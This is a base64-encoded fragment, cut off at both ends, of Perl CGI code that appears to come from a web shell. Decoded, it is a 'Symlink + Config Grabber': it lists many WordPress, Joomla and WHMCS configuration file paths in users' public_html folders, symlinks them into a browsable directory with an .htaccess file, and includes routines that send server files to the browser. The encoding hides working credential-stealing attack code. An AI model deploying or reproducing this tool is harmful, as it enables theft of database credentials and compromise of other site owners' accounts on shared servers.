L3dwLWNvbmZpZy5waHAnLCB0eXBlID0+ICdXb3JkcHJlc3MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9kZW1vL3dwLWNvbmZpZy5waHAnLCB0eXBlID0+ICdXb3JkcHJlc3MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9ob21lL3dwLWNvbmZpZy5waHAnLCB0eXBlID0+ICdXb3JkcHJlc3MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC92MS93cC1jb25maWcucGhwJywgdHlwZSA9PiAnV29yZHByZXNzJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvdjIvd3AtY29uZmlnLnBocCcsIHR5cGUgPT4gJ1dvcmRwcmVzcycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL3ByZXNzL3dwLWNvbmZpZy5waHAnLCB0eXBlID0+ICdXb3JkcHJlc3MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9uZXcvd3AtY29uZmlnLnBocCcsIHR5cGUgPT4gJ1dvcmRwcmVzcycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2Jsb2dzL3dwLWNvbmZpZy5waHAnLCB0eXBlID0+ICdXb3JkcHJlc3MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9jb25maWd1cmF0aW9uLnBocCcsIHR5cGUgPT4gJ0pvb21sYScgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2Jsb2cvY29uZmlndXJhdGlvbi5waHAnLCB0eXBlID0+ICdKb29tbGEnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnXldITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvY21zL2NvbmZpZ3VyYXRpb24ucGhwJywgdHlwZSA9PiAnSm9vbWxhJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvYmV0YS9jb25maWd1cmF0aW9uLnBocCcsIHR5cGUgPT4gJ0pvb21sYScgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL3BvcnRhbC9jb25maWd1cmF0aW9uLnBocCcsIHR5cGUgPT4gJ0pvb21sYScgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL3NpdGUvY29uZmlndXJhdGlvbi5waHAnLCB0eXBlID0+ICdKb29tbGEnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9tYWluL2NvbmZpZ3VyYXRpb24ucGhwJywgdHlwZSA9PiAnSm9vbWxhJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvaG9tZS9jb25maWd1cmF0aW9uLnBocCcsIHR5cGUgPT4gJ0pvb21sYScgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2RlbW8vY29uZmlndXJhdGlvbi5waHAnLCB0eXBlID0+ICdKb29tbGEnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC90ZXN0L2NvbmZpZ3VyYXRpb24ucGhwJywgdHlwZSA9PiAnSm9vbWxhJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvdjEvY29uZmlndXJhdGlvbi5waHAnLCB0eXBlID0+ICdKb29tbGEnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC92Mi9jb25maWd1cmF0aW9uLnBocCcsIHR5cGUgPT4gJ0pvb21sYScgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2pvb21sYS9jb25maWd1cmF0aW9uLnBocCcsIHR5cGUgPT4gJ0pvb21sYScgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL25ldy9jb25maWd1cmF0aW9uLnBocCcsIHR5cGUgPT4gJ0pvb21sYScgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL1dITUNTL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL3dobWNzMS9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9XaG1jcy9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC93aG1jcy9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC93aG1jcy9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9XSE1DL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL1dobWMvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvd2htYy9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9XSE0vc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvV2htL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL3dobS9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9IT1NUL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL0hvc3Qvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvaG9zdC9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9TVVBQT1JURVMvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvU3VwcG9ydGVzL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL3N1cHBvcnRlcy9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9kb21haW5zL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2RvbWFpbi9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9Ib3N0aW5nL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL0hPU1RJTkcvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvaG9zdGluZy9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9DQVJUL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL0NhcnQvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvY2FydC9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9PUkRFUi9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9PcmRlci9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9vcmRlci9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9DTElFTlQvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvQ2xpZW50L3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2NsaWVudC9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9DTElFTlRBUkVBL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL0NsaWVudGFyZWEvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvY2xpZW50YXJlYS9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9TVVBQT1JUL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL1N1cHBvcnQvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvc3VwcG9ydC9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9CSUxMSU5HL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL0JpbGxpbmcvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvYmlsbGluZy9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9CVVkvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvQnV5L3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2J1eS9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9NQU5BR0Uvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvTWFuYWdlL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL21hbmFnZS9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9DTElFTlRTVVBQT1JUL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL0NsaWVudFN1cHBvcnQvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvQ2xpZW50c3VwcG9ydC9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9jbGllbnRzdXBwb3J0L3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL0NIRUNLT1VUL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL0NoZWNrb3V0L3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2NoZWNrb3V0L3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL0JJTExJTkdTL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL0JpbGxpbmdzL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2JpbGxpbmdzL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL0JBU0tFVC9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9CYXNrZXQvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvYmFza2V0L3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL1NFQ1VSRS9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9TZWN1cmUvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvc2VjdXJlL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL1NBTEVTL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL1NhbGVzL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL3NhbGVzL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL0JJTEwvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvQmlsbC9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9iaWxsL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL1BVUkNIQVNFL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL1B1cmNoYXNlL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL3B1cmNoYXNlL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL0FDQ09VTlQvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvQWNjb3VudC9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9hY2NvdW50L3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL1VTRVIvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvVXNlci9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC91c2VyL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL0NMSUVOVFMvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvQ2xpZW50cy9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9jbGllbnRzL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL0JJTExJTkdTL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL0JpbGxpbmdzL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2JpbGxpbmdzL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL01ZL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL015L3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL215L3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL3NlY3VyZS93aG0vc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvc2VjdXJlL3dobWNzL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL3BhbmVsL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2NsaWVudGVzL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2NsaWVudGUvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvc3VwcG9ydC9vcmRlci9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0gKTsgZm9yZWFjaCAoQGFycmF5KXsgbXkgJGNvbmZpZ255YSA9ICRfLT57Y29uZmlnZGlyfTsgbXkgJHR5cGVjb25maWcgPSAkXy0+e3R5cGV9OyBzeW1saW5rKCIkY29uZmlnbnlhIiwic3ltbGlua19jb25maWcvJHVzZXJueWEtJHR5cGVjb25maWcudHh0Iik7IG1rZGlyICJzeW1saW5rX2NvbmZpZy8kdXNlcm55YS0kdHlwZWNvbmZpZy50eHQ0MDQiOyBzeW1saW5rKCIkY29uZmlnbnlhIiwic3ltbGlua19jb25maWcvJHVzZXJueWEtJHR5cGVjb25maWcudHh0NDA0L3BwcS50eHQiKTsgY29weSgic3ltbGlua19jb25maWcvbmVtdS50eHQiLCJzeW1saW5rX2NvbmZpZy8kdXNlcm55YS0kdHlwZWNvbmZpZy50eHQ0MDQvLmh0YWNjZXNzIikgOyB9IH0gcHJpbnQgInN1Y2Nlc3MiOw0KfQ0Kc3ViIEhlbHANCnsNCnByaW50ICI8Y29kZT4gSG93IFRvIFVzZXIgU3ltbGluayArIENvbmZpZyBHcmFiYmVyPyBKdXN0IEtsaWsgU3ltbGluayArIENvbmZpZyBHcmFiYmVyPGJyPiI7DQpwcmludCAiIFRoZW4gQ2hlY2sgRGlycyBCeSBFbnRlciBUaGUgVVJMPGJyPiI7DQpwcmludCAiIEV4YW1wbGU6IHNpdGUuY29tL2NnaWRpcnMvc3ltbGlua19jb25maWc8YnI+IjsNCnByaW50ICIgRm9yIFN5bWxpbmsgSnVzdCBBZGQgSW4gVXJsPGJyPiI7DQpwcmludCAiIEV4YW1wbGU6IHNpdGUuY29tL2NnaWRpcnMvc3ltbGlua19jb25maWcvcm9vdC88L2NvZGU+IjsNCn0NCnN1YiBTZW5kRmlsZVRvQnJvd3Nlcg0Kew0KbG9jYWwoJFNlbmRGaWxlKSA9IEBfOw0KaWYob3BlbihTRU5ERklMRSwgJFNlbmRGaWxlKSkgIyBmaWxlIG9wZW5lZCBmb3IgcmVhZGluZw0Kew0KaWYoJFdpbk5UKQ0Kew0KYmlubW9kZShTRU5ERklMRSk7DQpiaW5tb2RlKFNURE9VVCk7DQp9DQokRmlsZVNpemUgPSAoc3RhdCgkU2VuZEZpbGUpKVs3XTsNCigkRmlsZW5hbWUgPSAkU2VuZEZpbGUpID1+IG0hKFteL15cXF0qKSQhOw0KcHJpbnQgIkNvbnRlbnQtVHlwZTogYXBwbGljYXRpb24veC11bmtub3duXG4iOw0KcHJpbnQgIkNvbnRlbnQtTGVuZ3RoOiAkRmlsZVNpemVcbiI7DQpwcmludCAiQ29udGVudC1EaXNwb3NpdGlvbjogYXR0YWNobWVudDsgZmlsZW5hbWU9JDFcblxuIjsNCnByaW50IHdoaWxlKDxTRU5ERklMRT4pOw0KY2xvc2UoU0VOREZJTEUpOw0KfQ0KZWxzZSAjIGZhaWxlZCB0byBvcGVuIGZpbGUNCnsNCiZQcmludFBhZ2VIZWFkZXIoImYiKTsNCnByaW50ICI8Y29kZT5GYWlsZWQgdG8gZG93bmxvYWQgJFNlbmRGaWxlOiAkITwvY29kZT4iOw0KJlByaW50RmlsZURvd25sb2FkRm9ybTsNCiZQcmludFBhZ2VGb290ZXI7DQp9DQp9DQoNCg0Kc3ViIEJlZ2luRG93bmxvYWQNCnsNCiMgZ2V0IGZ1bGx5IHF1YWxpZmllZCBwYXRoIG9mIHRoZSBmaWxlIHRvIGJlIGRvd25sb2FkZWQNCmlmKCgkV2luTlQgJiAoJFRyYW5zZmVyRmlsZSA9fiBtL15cXHxeLjovKSkgfA0KKCEkV2luTlQgJiAoJFRyYW5zZmVyRmlsZSA9fiBtL15cLy8pKSkgIyBwYXRoIGlzIGFic29sdXRlDQp7DQokVGFyZ2V0RmlsZSA9ICRUcmFuc2ZlckZpbGU7DQp9DQplbHNlICMgcGF0aCBpcyByZWxhdGl2